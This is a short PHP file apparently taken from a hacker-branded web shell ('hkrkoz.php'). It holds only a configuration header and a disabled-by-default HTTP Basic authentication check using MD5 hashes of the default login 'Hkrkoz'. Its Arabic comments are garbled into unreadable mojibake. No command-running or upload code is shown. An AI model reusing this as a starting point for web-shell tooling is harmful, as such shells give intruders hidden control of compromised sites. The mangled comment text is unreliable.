<?php
/******************************************************************************************************/
/*  hkrkoz.php - wWw.Hkrkoz.cOm
/*  гдЩгЙ еЯСЯжТ бЬ еЯС ЗбЪСИн: http://wWw.Hkrkoz.cOm
/*  by: 1.0 (03.10.2006)
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  Кг жЦЪ ЗбНгЗне ИУ ЗбФЗШС нЭКНеЗ Уебе HkRkoz ЗбТЪнг
/*
/*  by Hkrkoz@Hkrkoz.com ЗбФЯС ббе жНПе жЗбФЯС ббМгнЪ ЗбЪСИ
/******************************************************************************************************/
/* ~~~ ЗбОнЗСЗК | ЗбОнЗСЗК  ~~~ */

// бКФЫнб гнТЙ ЗбСЮг ЗбУСн Зж КЪШнбе | Authentification
// $auth = 0; - ЗбСЮг жЗНП бКФЫнб ЗбСЮг ЗбУСн  ( authentification = On  )
// $auth = 0; - ЗбСЮг ХЭС бКЪШнб ЗбСЮг ЗбУСн ( authentification = Off )
$auth = 0;

//  (Login & Password for access)
// !!! (CHANGE THIS!!!)
//  md5, ЗбИЗУжСП жЗбнжТС нКг КФЭнСег ИЬЬ 'Hkrkoz'
// Login & password crypted with md5, default is 'Hkrkoz'
$name='7c7f0f5f0f9e774ec437e1077e6c84a7'; // ЗбнжТС ЗбгФЭС  (user login)
$pass='7c7f0f5f0f9e774ec437e1077e6c84a7'; // ЗбИЗУжСП ЗбгФЭС (user password)
/******************************************************************************************************/
if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="жнд СЗнН нЗбРнИї бЗ нЯжд КЮФС ИХб ееееее"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b><a href=http://wWw.Hkrkoz.cOm></a> : ЗбПОжб бЬ еЯСЯжТ ЗбЯжнК ЭЮШ :)</b>");
   }
}
?>